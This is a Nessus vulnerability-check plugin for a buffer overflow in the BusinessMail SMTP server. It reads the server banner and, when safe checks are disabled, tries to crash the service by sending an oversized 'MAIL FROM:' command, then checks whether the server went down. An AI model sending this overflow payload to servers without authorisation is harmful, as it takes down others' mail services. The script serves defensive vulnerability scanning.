#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(19365);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2005-2472");
  script_bugtraq_id(14434);
  script_xref(name:"OSVDB", value:"18407");

  script_name(english:"BusinessMail Multiple SMTP Command Remote Buffer Overflows");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote SMTP server is susceptible to buffer overflow attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running BusinessMail, a commercial mail server for
Windows from NetCPlus. 

The version of BusinessMail on the remote host fails to sanitize input
to the 'HELO' and 'MAIL FROM' SMTP commands, which can be exploited by
an unauthenticated remote attacker to crash the SMTP service and
possibly even execute arbitrary code within the context of the server
process." );
 script_set_attribute(attribute:"see_also", value:"http://reedarvin.thearvins.com/20050730-01.html" );
 script_set_attribute(attribute:"see_also", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2005-August/035647.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.attrition.org/pipermail/vim/2007-June/001640.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to BusinessMail 4.7 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 
  script_summary(english:"Checks for remote buffer overflow vulnerabilities in BusinessMail");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"SMTP problems");
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  script_exclude_keys("SMTP/wrapped");

  exit(0);
}


include("smtp_func.inc");


port = get_kb_item("Services/smtp");
if (!port) port = 25;
if (!get_port_state(port)) exit(0);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);


# If the banner suggests it's BusinessMail...
banner = get_smtp_banner(port:port);
if (banner && "BusinessMail SMTP server" >< banner) {
  # If safe checks are enabled...
  if (safe_checks()) {
    if (banner =~ "BusinessMail SMTP server ([0-3]\.|4\.([0-5].*|60.*|61\.0[0-2]))") {
      report = 
"Note that Nessus has determined the vulnerability exists on the
remote host simply by looking at the software's banner.
"; 
      security_hole(port:port, extra:report);
    }
  }
  # Otherwise...
  else {
    # Let's try to crash it.
    soc = smtp_open(port:port, helo:"nessus");
    if (!soc) exit(0);

    c = string("MAIL FROM:", crap(1000));
    send(socket:soc, data:string(c, "\r\n"));
    s = smtp_recv_line(socket:soc);
    close(soc);

    # Try once to reconnect.
    sleep(1);
    soc = open_sock_tcp(port);
    if (!soc || !smtp_recv_line(socket:soc)) {
      security_hole(port);
      exit(0);
    }
    close(soc);
  }
}
